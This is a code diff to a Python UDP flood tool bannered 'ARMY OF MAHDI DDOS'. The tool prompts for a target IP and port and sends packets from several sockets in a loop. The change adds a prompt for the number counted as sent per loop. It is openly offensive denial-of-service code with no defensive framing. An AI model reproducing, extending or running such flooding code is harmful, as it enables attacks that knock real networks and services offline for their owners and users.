@@ -12,6 +12,7 @@ print("ARMY OF MAHDI DDOS")
 print("Made By MrSanZz")
 ip = raw_input("IP : ")
 port = input("Port : ")
+size = input("Sent PerSec : ")
 try:
     fakeip = '192.165.4.4'
     soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -30,7 +31,7 @@ try:
         soc.sendto(bytes, (ip,port))
         soc2.sendto(bytes2, (ip,port))
         soc3.sendto(bytes, (ip,port))
-        sent = sent + 5000
+        sent = sent + size
         print "\033[1;34mSending \033[1;33m%s \033[1;34mBotnet To \033[1;33m%s \033[1;34mPort \033[1;33m%s"%(sent,ip,port)
 except KeyboardInterrupt:
     print("Keyboard Interrupt")
